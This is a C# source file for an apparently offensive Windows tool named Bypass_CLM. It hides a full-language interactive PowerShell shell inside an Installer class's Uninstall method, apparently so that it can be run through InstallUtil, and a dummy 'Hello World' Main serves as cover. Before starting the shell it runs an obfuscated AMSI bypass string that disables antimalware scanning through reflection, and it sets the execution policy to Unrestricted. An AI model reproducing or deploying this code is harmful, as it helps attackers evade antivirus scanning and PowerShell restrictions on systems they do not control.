using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Collections.ObjectModel;

namespace Bypass_CLM
{
    class Program
    {
        static void Main(string[] args)
        {
            // dummy
            Console.WriteLine("Hello World!");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string cmd;
            string ams1Bypa55 = "Set-Item('Variable:4ms1_byp4ss_99317')([Type]('ref'));(Get-Variable('4ms1_byp4ss_99317') -val).Assembly.GetType((\"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System')).GetfiElD((\"{0}{2}{1}\" -f'ams','d','iInitFaile'),('NonPublic,Static')).SetValue(${null},${true})";
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

            // Bypass4msi
            PowerShell ps = PowerShell.Create();
            ps.Runspace = runspace;
            ps.AddScript(ams1Bypa55);
            ps.Invoke();

            for (; ; )
            {
                Console.Write("PS " + runspace.SessionStateProxy.Path.CurrentLocation + ">");
                cmd = Console.ReadLine();
                if (cmd == "exit")
                {
                    break;
                }

                using (Pipeline pipeline = runspace.CreatePipeline())
                {
                    try
                    {
                        pipeline.Commands.AddScript(cmd);
                        pipeline.Commands.Add("Out-String");

                        Collection<PSObject> results = pipeline.Invoke();

                        StringBuilder stringBuilder = new StringBuilder();
                        foreach (PSObject obj in results)
                        {
                            stringBuilder.AppendLine(obj.ToString());
                        }
                        Console.Write(stringBuilder.ToString());
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("ERROR: " + ex.Message);
                    }
                }
            }
        }
    }
}